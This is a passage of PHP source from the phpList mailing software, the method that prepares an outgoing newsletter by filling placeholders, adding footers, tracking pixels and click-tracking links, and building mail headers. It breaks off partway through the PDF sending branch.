<?php
/**
 * User: SaWey
 * Date: 18/12/13
 */

namespace phpList;


class PrepareMessage
{
    /**
     * @param Message $message
     * @param string $email
     * @param string $hash
     * @param int $htmlpref
     * @param array $forwardedby
     * @return bool
     */
    public static function sendEmail(
        $message,
        $email,
        $hash,
        $htmlpref = 0,
        $forwardedby = array()
    ) {
        $getspeedstats = Config::VERBOSE && Config::get('getspeedstats', false) !== false && (Timer::get('PQC') != null);
        $sqlCountStart = phpList::DB()->getQueryCount();
        //TODO: remove $_GET from here
        $isTestMail = isset($_GET['page']) && $_GET['page'] == 'send';

        ## for testing concurrency, put in a delay to check if multiple send processes cause duplicates
        #usleep(rand(0,10) * 1000000);

        if ($email == '') {
            return 0;
        }
        if ($getspeedstats) Output::output('sendEmail start ' . Timer::get('PQC')->interval(1));

        #0013076: different content when forwarding 'to a friend'
        if (Config::FORWARD_ALTERNATIVE_CONTENT) {
            $forwardContent = sizeof($forwardedby) > 0;
        } else {
            $forwardContent = 0;
        }

        if (Cache::getCachedMessage($message) == false){
            if (!PrepareMessage::precacheMessage($message, $forwardContent)) {
                Logger::logEvent('Error loading message ' . $message->id . '  in cache');
                return false;
            }
        } else {
            #  dbg("Using cached {$cached->fromemail}");
            if (Config::VERBOSE) Output::output('Using cached message');
        }
        /**
         * @var Message
         */
        $cached_message = Cache::getCachedMessage($message);

        if (Config::VERBOSE) {
            Output::output(s('Sending message %d with subject %s to %s', $message->id, $cached_message->subject, $email));
        }

        ## at this stage we don't know whether the content is HTML or text, it's just content
        $content = $cached_message->content;

        if ($getspeedstats) {
            Output::output('Load user start');
        }

        #0011857: forward to friend, retain attributes
        if ($hash == 'forwarded' && Config::KEEPFORWARDERATTRIBUTES) {
            $user = User::getUserByEmail($forwardedby['email']);
        } elseif ($hash != 'forwarded') {
            $user = User::getUserByEmail($email);
        }

        $user_att_values = $user->getCleanAttributes();

        $html = $text = array();
        if (stripos($content, '[LISTS]') !== false) {
            $lists = MailingList::getListsForUser($user->id);
            if (!empty($lists)) {
                foreach($lists as $list){
                    $html['lists'] .= '<br/>' . $list->name;
                    $text['lists'] .= "\n" . $list->name;
                }
            } else {
                $html['lists'] = s('strNoListsFound');
                $text['lists'] = s('strNoListsFound');
            }
        }

        if ($getspeedstats) {
            Output::output('Load user end');
        }

        if ($cached_message->userspecific_url) {
            if ($getspeedstats) {
                Output::output('fetch personal URL start');
            }

            ## Fetch external content, only if the URL has placeholders
            //TODO: I changed can_fetchUrl to can_fetch_url -> make sure it's changed everywhere
            if (Config::get('can_fetch_url') && preg_match('/\[URL:([^\s]+)\]/i', $content, $regs)) {
                while (isset($regs[1]) && strlen($regs[1])) {
                    $url = $regs[1];
                    if (!preg_match('/^http/i', $url)) {
                        $url = 'http://' . $url;
                    }
                    $remote_content = Util::fetchUrl($url, $user);

                    # @@ don't use this
                    #      $remote_content = includeStyles($remote_content);

                    if ($remote_content) {
                        $content = str_replace($regs[0], $remote_content, $content);
                        $cached_message->htmlformatted = strip_tags($content) != $content;
                    } else {
                        Logger::logEvent("Error fetching URL: $regs[1] to send to $email");
                        return 0;
                    }
                    preg_match('/\[URL:([^\s]+)\]/i', $content, $regs);
                }
            }
            if ($getspeedstats) {
                Output::output('fetch personal URL end');
            }
        }

        if ($getspeedstats) {
            Output::output('define placeholders start');
        }

        $url = Config::get('unsubscribeurl');
        ## https://mantis.phplist.com/view.php?id=16680 -> the "sep" should be & for the text links
        $sep = strpos($url, '?') === false ? '?' : '&';

        $html['unsubscribe'] = sprintf(
            '<a href="%s%suid=%s">%s</a>',
            $url,
            htmlspecialchars($sep),
            $hash,
            s('Unsubscribe')
        );
        $text['unsubscribe'] = sprintf('%s%suid=%s', $url, $sep, $hash);
        $text['jumpoff'] = sprintf('%s%suid=%s&jo=1', $url, $sep, $hash);
        $html['unsubscribeurl'] = sprintf('%s%suid=%s', $url, htmlspecialchars($sep), $hash);
        $text['unsubscribeurl'] = sprintf('%s%suid=%s', $url, $sep, $hash);
        $text['jumpoffurl'] = sprintf('%s%suid=%s&jo=1', $url, $sep, $hash);

        #0013076: Blacklisting posibility for unknown users
        $url = Config::get('blacklisturl');
        $sep = strpos($url, '?') === false ? '?' : '&';
        $html["blacklist"] = sprintf(
            '<a href="%s%semail=%s">%s</a>',
            $url,
            htmlspecialchars($sep),
            $email,
            s('Unsubscribe')
        );
        $text['blacklist'] = sprintf('%s%semail=%s', $url, $sep, $email);
        $html['blacklisturl'] = sprintf('%s%semail=%s', $url, htmlspecialchars($sep), $email);
        $text['blacklisturl'] = sprintf('%s%semail=%s', $url, $sep, $email);

        #0013076: Problem found during testing: message part must be parsed correctly as well.
        if (sizeof($forwardedby) && isset($forwardedby['email'])) {
            $html['unsubscribe'] = $html['blacklist'];
            $text['unsubscribe'] = $text['blacklist'];
            $html['forwardedby'] = $forwardedby['email'];
            $text['forwardedby'] = $forwardedby['email'];
        }

        $url = Config::get('subscribeurl');
        //$sep = strpos($url, '?') === false ? '?' : '&';
        $html['subscribe'] = sprintf('<a href="%s">%s</a>', $url, s('this link'));
        $text['subscribe'] = sprintf('%s', $url);
        $html['subscribeurl'] = sprintf('%s', $url);
        $text['subscribeurl'] = sprintf('%s', $url);
        $url = Config::get('forwardurl');
        $sep = strpos($url, '?') === false ? '?' : '&';
        $html['forward'] = sprintf(
            '<a href="%s%suid=%s&amp;mid=%d">%s</a>',
            $url,
            htmlspecialchars($sep),
            $hash,
            $message->id,
            s('this link')
        );
        $text['forward'] = sprintf('%s%suid=%s&mid=%d', $url, $sep, $hash, $message->id);
        $html['forwardurl'] = sprintf('%s%suid=%s&amp;mid=%d', $url, htmlspecialchars($sep), $hash, $message->id);
        $text['forwardurl'] = $text['forward'];
        $html['messageid'] = sprintf('%d', $message->id);
        $text['messageid'] = sprintf('%d', $message->id);
        $url = Config::get('forwardurl');

        # make sure there are no newlines, otherwise they get turned into <br/>s
        $html['forwardform'] = sprintf(
            '<form method="get" action="%s" name="forwardform" class="forwardform"><input type="hidden" name="uid" value="%s" /><input type="hidden" name="mid" value="%d" /><input type="hidden" name="p" value="forward" /><input type=text name="email" value="" class="forwardinput" /><input name="Send" type="submit" value="%s" class="forwardsubmit"/></form>',
            $url,
            $hash,
            $message->id,
            $GLOBALS['strForward']
        );
        $text['signature'] = "\n\n-- powered by phpList, www.phplist.com --\n\n";
        $url = Config::get("preferencesurl");
        $sep = strpos($url, '?') === false ? '?' : '&';
        $html['preferences'] = sprintf(
            '<a href="%s%suid=%s">%s</a>',
            $url,
            htmlspecialchars($sep),
            $hash,
            s('this link')
        );
        $text['preferences'] = sprintf('%s%suid=%s', $url, $sep, $hash);
        $html['preferencesurl'] = sprintf('%s%suid=%s', $url, htmlspecialchars($sep), $hash);
        $text['preferencesurl'] = sprintf('%s%suid=%s', $url, $sep, $hash);

        $url = Config::get("confirmationurl");
        $sep = strpos($url, '?') === false ? '?' : '&';
        $html['confirmationurl'] = sprintf('%s%suid=%s', $url, htmlspecialchars($sep), $hash);
        $text['confirmationurl'] = sprintf('%s%suid=%s', $url, $sep, $hash);

        #historical, not sure it's still used
        $html['userid'] = $hash;
        $text['userid'] = $hash;

        $html['website'] = $GLOBALS['website']; # Your website's address, e.g. www.yourdomain.com
        $text['website'] = $GLOBALS['website'];
        $html['domain'] = $GLOBALS['domain']; # Your domain, e.g. yourdomain.com
        $text['domain'] = $GLOBALS['domain'];

        if ($hash != 'forwarded') {
            $text['footer'] = $cached_message->textfooter;
            $html['footer'] = $cached_message->htmlfooter;
        } else {
            #0013076: different content when forwarding 'to a friend'
            if (Config::FORWARD_ALTERNATIVE_CONTENT) {
                $text['footer'] = stripslashes($message->forwardfooter);
            } else {
                $text['footer'] = Config::get('forwardfooter');
            }
            $html['footer'] = $text['footer'];
        }

        /*
          We request you retain the signature below in your emails including the links.
          This not only gives respect to the large amount of time given freely
          by the developers  but also helps build interest, traffic and use of
          phpList, which is beneficial to it's future development.

          You can configure how the credits are added to your pages and emails in your
          config file.

          Michiel Dethmers, phpList Ltd 2003 - 2013
        */
        if (!Config::EMAILTEXTCREDITS) {
            $html['signature'] = Config::get('PoweredByImage'); #'<div align="center" id="signature"><a href="http://www.phplist.com"><img src="powerphplist.png" width=88 height=31 title="Powered by PHPlist" alt="Powered by PHPlist" border="0" /></a></div>';
            # oops, accidentally became spyware, never intended that, so take it out again :-)
            $html['signature'] = preg_replace(
                '/src=".*power-phplist.png"/',
                'src="powerphplist.png"',
                $html['signature']
            );
        } else {
            $html['signature'] = Config::get('PoweredByText');
        }
        #  $content = $cached->htmlcontent;

        if ($getspeedstats) {
            Output::output('define placeholders end');
        }

        ## Fill text and html versions depending on given versions.

        if ($getspeedstats) {
            Output::output('parse text to html or html to text start');
        }

        if ($cached_message->htmlformatted) {
            if (empty($cached_message->textcontent)) {
                $textcontent = String::HTML2Text($content);
            } else {
                $textcontent = $cached_message->textcontent;
            }
            $htmlcontent = $content;
        } else {
            if (empty($cached_message->textcontent)) {
                $textcontent = $content;
            } else {
                $textcontent = $cached_message->textcontent;
            }
            $htmlcontent = PrepareMessage::parseText($content);
        }

        if ($getspeedstats) {
            Output::output('parse text to html or html to text end');
        }

        $defaultstyle = Config::get('html_email_style');
        $adddefaultstyle = 0;

        if ($getspeedstats) {
            Output::output('merge into template start');
        }

        if ($cached_message->template)
            # template used
            $htmlmessage = str_replace('[CONTENT]', $htmlcontent, $cached_message->template);
        else {
            # no template used
            $htmlmessage = $htmlcontent;
            $adddefaultstyle = 1;
        }
        $textmessage = $textcontent;

        if ($getspeedstats) {
            Output::output('merge into template end');
        }
        ## Parse placeholders

        if ($getspeedstats) {
            Output::output('parse placeholders start');
        }


        /*
          var_dump($html);
          var_dump($userdata);
          var_dump($user_att_values);
          exit;
        */


        #print htmlspecialchars($htmlmessage);exit;

        ### @@@TODO don't use forward and forward form in a forwarded message as it'll fail

        if (strpos($htmlmessage, '[FOOTER]') !== false)
            $htmlmessage = str_ireplace('[FOOTER]', $html['footer'], $htmlmessage);
        elseif ($html['footer'])
            $htmlmessage = PrepareMessage::addHTMLFooter($htmlmessage, '<br />' . $html['footer']);

        if (strpos($htmlmessage, '[SIGNATURE]') !== false) {
            $htmlmessage = str_ireplace('[SIGNATURE]', $html['signature'], $htmlmessage);
        } else {
        # BUGFIX 0015303, 2/2
        //    $htmlmessage .= '<br />'.$html['signature'];
            $htmlmessage = PrepareMessage::addHTMLFooter(
                $htmlmessage,
                '
               ' . $html['signature']
            );
        }


        # END BUGFIX 0015303, 2/2

        if (strpos($textmessage, '[FOOTER]'))
            $textmessage = str_ireplace('[FOOTER]', $text['footer'], $textmessage);
        else
            $textmessage .= "\n\n" . $text['footer'];

        if (strpos($textmessage, '[SIGNATURE]'))
            $textmessage = str_ireplace('[SIGNATURE]', $text['signature'], $textmessage);
        else
            $textmessage .= "\n" . $text['signature'];

        ### addition to handle [FORWARDURL:Message ID:Link Text] (link text optional)

        while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm', $htmlmessage, $regs)) {
            $newforward = $regs[1];
            $matchtext = $regs[0];
            if (strpos($newforward, ':')) {
                ## using FORWARDURL:messageid:linktext
                list($forwardmessage, $forwardtext) = explode(':', $newforward);
            } else {
                $forwardmessage = sprintf('%d', $newforward);
                $forwardtext = 'this link';
            }
            if (!empty($forwardmessage)) {
                $url = Config::get('forwardurl');
                $sep = strpos($url, '?') === false ? '?' : '&';
                $forwardurl = sprintf('%s%suid=%s&mid=%d', $url, $sep, $hash, $forwardmessage);
                $htmlmessage = str_replace(
                    $matchtext,
                    '<a href="' . htmlspecialchars($forwardurl) . '">' . $forwardtext . '</a>',
                    $htmlmessage
                );
            } else {
                ## make sure to remove the match, otherwise, it'll be an eternal loop
                $htmlmessage = str_replace($matchtext, '', $htmlmessage);
            }
        }

        ## the text message has to be parsed seperately, because the line might wrap if the text for the link is long, so the match text is different
        while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm', $textmessage, $regs)) {
            $newforward = $regs[1];
            $matchtext = $regs[0];
            if (strpos($newforward, ':')) {
                ## using FORWARDURL:messageid:linktext
                list($forwardmessage, $forwardtext) = explode(':', $newforward);
            } else {
                $forwardmessage = sprintf('%d', $newforward);
                $forwardtext = 'this link';
            }
            if (!empty($forwardmessage)) {
                $url = Config::get('forwardurl');
                $sep = strpos($url, '?') === false ? '?' : '&';
                $forwardurl = sprintf('%s%suid=%s&mid=%d', $url, $sep, $hash, $forwardmessage);
                $textmessage = str_replace($matchtext, $forwardtext . ' ' . $forwardurl, $textmessage);
            } else {
                ## make sure to remove the match, otherwise, it'll be an eternal loop
                $textmessage = str_replace($matchtext, '', $textmessage);
            }
        }

        #  $req = Sql_Query(sprintf('select filename,data from %s where template = %d',
        #    Config::getTableName('templateimage'),$cached->templateid));

        if (Config::ALWAYS_ADD_USERTRACK) {
            if (stripos($htmlmessage, '</body>')) {
                $htmlmessage = str_replace(
                    '</body>',
                    '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                    Config::PAGEROOT . '/ut.php?u=' . $hash . '&amp;m=' . $message->id .
                    '" width="1" height="1" border="0" /></body>',
                    $htmlmessage
                );
            } else {
                $htmlmessage .= '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                    Config::PAGEROOT . '/ut.php?u=' . $hash . '&amp;m=' . $message->id .
                    '" width="1" height="1" border="0" />';
            }
        } else {
            ## can't use str_replace or str_ireplace, because those replace all, and we only want to replace one
            $htmlmessage = preg_replace(
                '/\[USERTRACK\]/i',
                '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                Config::PAGEROOT . '/ut.php?u=' . $hash . '&amp;m=' . $message->id .
                '" width="1" height="1" border="0" />',
                $htmlmessage,
                1
            );
        }
        # make sure to only include usertrack once, otherwise the stats would go silly
        $htmlmessage = str_ireplace('[USERTRACK]', '', $htmlmessage);

        $html['subject'] = $cached_message->subject;
        $text['subject'] = $cached_message->subject;

        $htmlmessage = PrepareMessage::parsePlaceHolders($htmlmessage, $html);
        $textmessage = PrepareMessage::parsePlaceHolders($textmessage, $text);

        if ($getspeedstats) {
            Output::output('parse placeholders end');
        }

        if ($getspeedstats) {
            Output::output('parse userdata start');
        }

        $userdata = array();
        foreach(User::$DB_ATTRIBUTES as $key){
            $userdata[$key] = $user->$key;
        }
        $htmlmessage = PrepareMessage::parsePlaceHolders($htmlmessage, $userdata);
        $textmessage = PrepareMessage::parsePlaceHolders($textmessage, $userdata);

        //CUT 2

        $destinationemail = '';
        if (is_array($user_att_values)) {
        // CUT 3
            $htmlmessage = PrepareMessage::parsePlaceHolders($htmlmessage, $user_att_values);
            $textmessage = PrepareMessage::parsePlaceHolders($textmessage, $user_att_values);
        }

        if ($getspeedstats) {
            Output::output('parse userdata end');
        }

        if (!$destinationemail) {
            $destinationemail = $email;
        }

        # this should move into a plugin
        if (strpos($destinationemail, '@') === false && Config::get('expand_unqualifiedemail', false) !== false) {
            $destinationemail .= Config::get('expand_unqualifiedemail');
        }

        if ($getspeedstats) {
            Output::output('pass to plugins for destination email start');
        }
        /*TODO: enable plugins
        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
        #    print "Checking Destination for ".$plugin->name."<br/>";
            $destinationemail = $plugin->setFinalDestinationEmail($message->id, $user_att_values, $destinationemail);
        }
        if ($getspeedstats) {
            Output::output('pass to plugins for destination email end');
        }

        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
            $textmessage = $plugin->parseOutgoingTextMessage($message->id, $textmessage, $destinationemail, $userdata);
            $htmlmessage = $plugin->parseOutgoingHTMLMessage($message->id, $htmlmessage, $destinationemail, $userdata);
        }*/

        ## click tracking
        # for now we won't click track forwards, as they are not necessarily users, so everything would fail
        if ($getspeedstats) {
            Output::output('click track start');
        }

        if (Config::CLICKTRACK && $hash != 'forwarded') {
            $urlbase = '';
            # let's leave this for now
            /*
            if (preg_match('/<base href="(.*)"([^>]*)>/Umis',$htmlmessage,$regs)) {
              $urlbase = $regs[1];
            } else {
              $urlbase = '';
            }
        #    print "URLBASE: $urlbase<br/>";
            */

            # convert html message
            #preg_match_all('/<a href="?([^> "]*)"?([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
            preg_match_all('/<a (.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis', $htmlmessage, $links);

            # to process the Yahoo webpage with base href and link like <a href=link> we'd need this one
            #preg_match_all('/<a href=([^> ]*)([^>]*)>(.*)<\/a>/Umis',$htmlmessage,$links);
            $clicktrack_root = sprintf('%s://%s/lt.php', Config::get('public_scheme'), Config::get('website') . Config::PAGEROOT);
            for ($i = 0; $i < count($links[2]); $i++) {
                $link = Util::cleanUrl($links[2][$i]);
                $link = str_replace('"', '', $link);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }
                //$linkid = 0;

                $linktext = $links[4][$i];

                ## if the link is text containing a "protocol" eg http:// then do not track it, otherwise
                ## it will look like Phishing
                ## it's ok when the link is an image
                $linktext = strip_tags($linktext);
                $looksLikePhishing = stripos($linktext, 'https://') !== false || stripos(
                        $linktext,
                        'http://'
                    ) !== false;

                if (!$looksLikePhishing && (preg_match('/^http|ftp/', $link) || preg_match(
                            '/^http|ftp/',
                            $urlbase
                        )) && (stripos($link, 'www.phplist.com') === false) && !strpos($link, $clicktrack_root)
                ) {
                    # take off personal uids
                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));

                    #$url = preg_replace('/&uid=[^\s&]+/','',$link);

                    #if (!strpos('http:',$link)) {
                    #   $link = $urlbase . $link;
                    #}

                    $linkid = PrepareMessage::clickTrackLinkId($message->id, $user->id, $url, $link);

                    $masked = "H|$linkid|$message->id|" . $user->id ^ Config::get('XORmask');
                    $masked = base64_encode($masked);
                    ## 15254- the encoding adds one or two extraneous = signs, take them off
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = urlencode($masked);

                    if (Config::get('CLICKTRACK_LINKMAP', false) === false) {
                        $newlink = sprintf(
                            '<a %shref="%s://%s/lt.php?id=%s" %s>%s</a>',
                            $links[1][$i],
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked,
                            $links[3][$i],
                            $links[4][$i]
                        );
                    } else {
                        $newlink = sprintf(
                            '<a %shref="%s://%s%s" %s>%s</a>',
                            $links[1][$i],
                            Config::get('public_scheme'),
                            Config::get('website') . Config::get('CLICKTRACK_LINKMAP'),
                            $masked,
                            $links[3][$i],
                            $links[4][$i]
                        );
                    }
                    $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
                }
            }

            # convert Text message
            # first find occurances of our top domain, to avoid replacing them later

            # hmm, this is no point, it's not just *our* topdomain, but any

            if (0) {
                preg_match_all('#(https?://' . Config::get('website') . '/?)\s+#mis', $textmessage, $links);
                #preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
                #preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);

                for ($i = 0; $i < count($links[1]); $i++) {
                    # not entirely sure why strtolower was used, but it seems to break things http://mantis.phplist.com/view.php?id=4406
                    #$link = strtolower(cleanUrl($links[1][$i]));
                    $link = Util::cleanUrl($links[1][$i]);
                    if (preg_match('/\.$/', $link)) {
                        $link = substr($link, 0, -1);
                    }
                    $linkid = 0;
                    if (preg_match('/^http|ftp/', $link)
                        && (stripos($link, 'www.phplist.com') === false)
                        && !strpos($link, $clicktrack_root)
                    ) {
                        $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
                        phpList::DB()->query(sprintf(
                                'INSERT IGNORE INTO %s (messageid, userid, url, forward)
                                 VALUES(%d, %d, "%s", "%s")',
                                Config::getTableName('linktrack'),
                                $message->id,
                                $user->id,
                                $url,
                                $link
                            ));
                        $req = phpList::DB()->fetchRowQuery(sprintf(
                                'SELECT linkid FROM %s
                                WHERE messageid = %s
                                AND userid = %d
                                AND forward = "%s"',
                                Config::getTableName('linktrack'),
                                $message->id,
                                $user->id,
                                $link
                            )
                        );
                        $linkid = $req[0];

                        $masked = "T|$linkid|$message->id|" . $user->id ^ Config::get('XORmask');
                        $masked = urlencode(base64_encode($masked));
                        $newlink = sprintf(
                            '%s://%s/lt.php?id=%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked
                        );
                        $textmessage = str_replace($links[0][$i], '<' . $newlink . '>', $textmessage);
                    }
                }

            }
            #now find the rest
            # @@@ needs to expand to find complete urls like:
            #http://user:password@www.web-site.com:1234/document.php?parameter=something&otherpar=somethingelse#anchor
            # or secure
            #https://user:password@www.website.com:2345/document.php?parameter=something%20&otherpar=somethingelse#anchor

            preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textmessage, $links);
            #preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textmessage,$links);
            #preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textmessage,$links);
            ## sort the results in reverse order, so that they are replaced correctly
            rsort($links[1]);
            $newlinks = array();

            for ($i = 0; $i < count($links[1]); $i++) {
                $link = Util::cleanUrl($links[1][$i]);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }

                $linkid = 0;
                if (preg_match('/^http|ftp/', $link)
                    && stripos($link, 'www.phplist.com') === false
                ) { # && !strpos($link,$clicktrack_root)) {
                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));

                    $linkid = PrepareMessage::clickTrackLinkId($message->id, $user->id, $url, $link);

                    $masked = "T|$linkid|$message->id|" . $user->id ^ Config::get('XORmask');
                    $masked = base64_encode($masked);
                    ## 15254- the encoding adds one or two extraneous = signs, take them off
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = urlencode($masked);
                    if (Config::get('CLICKTRACK_LINKMAP', false) === false) {
                        $newlinks[$linkid] = sprintf(
                            '%s://%s/lt.php?id=%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked
                        );
                    } else {
                        $newlinks[$linkid] = sprintf(
                            '%s://%s%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::get('CLICKTRACK_LINKMAP'),
                            $masked
                        );
                    }

                    #print $links[0][$i] .' -> '.$newlink.'<br/>';
                    $textmessage = str_replace($links[1][$i], '[%%%' . $linkid . '%%%]', $textmessage);
                }
            }
            foreach ($newlinks as $linkid => $newlink) {
                $textmessage = str_replace('[%%%' . $linkid . '%%%]', $newlink, $textmessage);
            }
        }
        if ($getspeedstats) {
            Output::output('click track end');
        }

        ## if we're not tracking clicks, we should add Google tracking here
        ## otherwise, we can add it when redirecting on the click
        if (!Config::CLICKTRACK && !empty($cached_message->google_track)) {
            preg_match_all('/<a (.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis', $htmlmessage, $links);
            for ($i = 0; $i < count($links[2]); $i++) {
                $link = Util::cleanUrl($links[2][$i]);
                $link = str_replace('"', '', $link);
                ## http://www.google.com/support/analytics/bin/answer.py?hl=en&answer=55578

                $trackingcode = 'utm_source=emailcampaign' . $message->id .
                    '&utm_medium=phpList&utm_content=HTMLemail&utm_campaign=' . urlencode($cached_message->subject);
                ## take off existing tracking code, if found
                if (strpos($link, 'utm_medium') !== false) {
                    $link = preg_replace('/utm_(\w+)\=[^&]+&/U', '', $link);
                }

                if (strpos($link, '?')) {
                    $newurl = $link . '&' . $trackingcode;
                } else {
                    $newurl = $link . '?' . $trackingcode;
                }
                #   print $link. ' '.$newurl.' <br/>';
                $newlink = sprintf('<a %shref="%s" %s>%s</a>', $links[1][$i], $newurl, $links[3][$i], $links[4][$i]);
                $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
            }

            preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textmessage, $links);
            rsort($links[1]);
            $newlinks = array();

            for ($i = 0; $i < count($links[1]); $i++) {
                $link = Util::cleanUrl($links[1][$i]);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }

                if (preg_match('/^http|ftp/', $link)
                    && (stripos($link, 'www.phplist.com') !== 0)
                ) { # && !strpos($link,$clicktrack_root)) {
                    //$url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
                    $trackingcode = 'utm_source=emailcampaign' . $message->id .
                        '&utm_medium=phpList&utm_content=textemail&utm_campaign=' . urlencode($cached_message->subject);
                    ## take off existing tracking code, if found
                    if (strpos($link, 'utm_medium') !== false) {
                        $link = preg_replace('/utm_(\w+)\=[^&]+/', '', $link);
                    }
                    if (strpos($link, '?')) {
                        $newurl = $link . '&' . $trackingcode;
                    } else {
                        $newurl = $link . '?' . $trackingcode;
                    }

                    $newlinks[$i] = $newurl;
                    $textmessage = str_replace($links[1][$i], '[%%%' . $i . '%%%]', $textmessage);
                }
            }
            foreach ($newlinks as $linkid => $newlink) {
                $textmessage = str_replace('[%%%' . $linkid . '%%%]', $newlink, $textmessage);
            }
            unset($newlinks);
        }

        #print htmlspecialchars($htmlmessage);exit;

        #0011996: forward to friend - personal message
        if (Config::FORWARD_PERSONAL_NOTE_SIZE && $hash == 'forwarded' && !empty($forwardedby['personalNote'])) {
            $htmlmessage = nl2br($forwardedby['personalNote']) . '<br/>' . $htmlmessage;
            $textmessage = $forwardedby['personalNote'] . "\n" . $textmessage;
        }
        if ($getspeedstats) {
            Output::output('cleanup start');
        }

        ## allow fallback to default value for the ones that do not have a value
        ## delimiter is %% to avoid interfering with markup

        preg_match_all('/\[.*\%\%([^\]]+)\]/Ui', $htmlmessage, $matches);
        for ($i = 0; $i < count($matches[0]); $i++) {
            $htmlmessage = str_ireplace($matches[0][$i], $matches[1][$i], $htmlmessage);
        }
        preg_match_all('/\[.*\%\%([^\]]+)\]/Ui', $textmessage, $matches);
        for ($i = 0; $i < count($matches[0]); $i++) {
            $textmessage = str_ireplace($matches[0][$i], $matches[1][$i], $textmessage);
        }

        ## remove any remaining placeholders
        ## 16671 - do not do this, as it'll remove conditional CSS and other stuff
        ## that we'd like to keep
        //$htmlmessage = preg_replace("/\[[A-Z\. ]+\]/i","",$htmlmessage);
        //$textmessage = preg_replace("/\[[A-Z\. ]+\]/i","",$textmessage);
        #print htmlspecialchars($htmlmessage);exit;

        # check that the HTML message as proper <head> </head> and <body> </body> tags
        # some readers fail when it doesn't
        if (!preg_match("#<body.*</body>#ims", $htmlmessage)) {
            $htmlmessage = '<body>' . $htmlmessage . '</body>';
        }
        if (!preg_match("#<head.*</head>#ims", $htmlmessage)) {
            if (!$adddefaultstyle) {
                $defaultstyle = "";
            }
            $htmlmessage = '<head>
        <meta content="text/html;charset=' . $cached_message->html_charset . '" http-equiv="Content-Type">
        <title></title>' . $defaultstyle . '</head>' . $htmlmessage;
        }
        if (!preg_match("#<html.*</html>#ims", $htmlmessage)) {
            $htmlmessage = '<html>' . $htmlmessage . '</html>';
        }

        ## remove trailing code after </html>
        $htmlmessage = preg_replace('#</html>.*#msi', '</html>', $htmlmessage);

        ## the editor sometimes places <p> and </p> around the URL
        $htmlmessage = str_ireplace('<p><!DOCTYPE', '<!DOCTYPE', $htmlmessage);
        $htmlmessage = str_ireplace('</html></p>', '</html>', $htmlmessage);

        if ($getspeedstats) {
            Output::output('cleanup end');
        }
#  $htmlmessage = compressContent($htmlmessage);

        # print htmlspecialchars($htmlmessage);exit;

        if ($getspeedstats) Output::output('build Start ' . Config::get('processqueue_timer')->interval(1));

        # build the email
        $mail = new phpListMailer($message->id, $destinationemail);
        if ($forwardedby) {
            $mail->add_timestamp();
        }
        $mail->addCustomHeader("List-Help: <" . $text['preferences'] . ">");
        $mail->addCustomHeader("List-Unsubscribe: <" . $text['jumpoffurl'] . ">");
        $mail->addCustomHeader("List-Subscribe: <" . Config::get("subscribeurl") . ">");
        $mail->addCustomHeader("List-Owner: <mailto:" . Config::get("admin_address") . ">");

        list($dummy, $domaincheck) = explode('@', $destinationemail);
        $text_domains = explode("\n", trim(Config::get("alwayssendtextto")));
        if (in_array($domaincheck, $text_domains)) {
            $htmlpref = 0;
            if (Config::VERBOSE)
                Output::output(s('sendingtextonlyto') . " $domaincheck");
        }
        /*TODO: enable plugins
        foreach (Config::get('plugins') as $pluginname => $plugin) {
            #$textmessage = $plugin->parseOutgoingTextMessage($message->id,$textmessage,$destinationemail, $userdata);
            #$htmlmessage = $plugin->parseOutgoingHTMLMessage($message->id,$htmlmessage,$destinationemail, $userdata);
            $plugin_attachments = $plugin->getMessageAttachment($message->id, $mail->Body);
            if (!empty($plugin_attachments[0]['content'])) {
                foreach ($plugins_attachments as $plugin_attachment) {
                    $mail->add_attachment(
                        $plugin_attachment['content'],
                        basename($plugin_attachment['filename']),
                        $plugin_attachment['mimetype']
                    );
                }
            }
        }*/

        # so what do we actually send?
        switch ($cached_message->sendformat) {
            case "PDF":
                # send a PDF file to users who want html and text to everyone else
                /*TODO: enable plugins
                foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
                    $plugin->processSuccesFailure($message->id, 'astext', $userdata);
                }*/
                if ($htmlpref) {
                    if (!$isTestMail){
                        $message->aspdf += 1;
                        $message->update();
                    }
                    $pdffile = PrepareMessage::createPdf($textmessage);
                    if (is_file($pdffile) && filesize($pdffile)) {
                        $fp = fopen($pdffile, "r");
                        if ($fp) {
                            $contents = fread($fp, filesize($pdffile));
                            fclose($fp);
                            unlink($pdffile);
                            $html = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
              <html>
              <head>
                <title></title>
              </head>
              <body>
              <embed src="message.pdf" width="450" height="450" href="message.pdf"></embed>
              </body>
              </html>';
